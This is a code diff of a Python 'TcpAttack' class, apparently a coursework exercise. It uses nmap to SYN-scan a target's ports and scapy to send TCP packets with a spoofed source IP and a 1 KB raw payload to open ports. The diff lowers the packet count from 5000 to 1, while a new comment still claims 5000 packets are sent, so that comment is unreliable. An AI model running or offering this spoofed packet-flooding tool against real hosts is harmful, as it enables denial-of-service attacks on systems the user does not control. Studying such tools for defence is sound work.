@@ -1,8 +1,9 @@
-from random import randint
+#from random import randint
 import nmap, ipaddress, tcp as TCP
 from scapy.modules.six import StringIO
 from scapy.layers.inet import IP
 from scapy.all import *
+#it is important to install the latest version of python nmap/nmap
 # Python version : Python 3.9.2
 
 class TcpAttack:
@@ -12,7 +13,7 @@ class TcpAttack:
         
     def scanTarget(self, rangeStart, rangeEnd):
         nm=nmap.PortScanner()
-        #opens a new .txt file to output open ports
+        # always opens a new .txt file to output open ports-called(openports)
         f= open("openports.txt","w+")
         for port in range( rangeStart, rangeEnd + 1):
             try:
@@ -31,10 +32,14 @@ class TcpAttack:
     def attackTarget(self, port):
         
         nm=nmap.PortScanner()
+        # perform a half open scan
         result = nm.scan(self.targetIP, str(port), '-sS')
         port_status = (result['scan'][self.targetIP]['tcp'][port]['state'])
+        #r is the raw set of bites to be sent in the packets
+        r = Raw(b"X"*1024)
         if port_status=="open":
-            send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(sport=RandShort(),dport=port)/r, count=5000)
+            #this part sends 5000 packets instead of the unlimited amount to the target
+            send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(sport=RandShort(),dport=port)/r, count=1)
             return 1
         elif port_status == "close":
             return 0
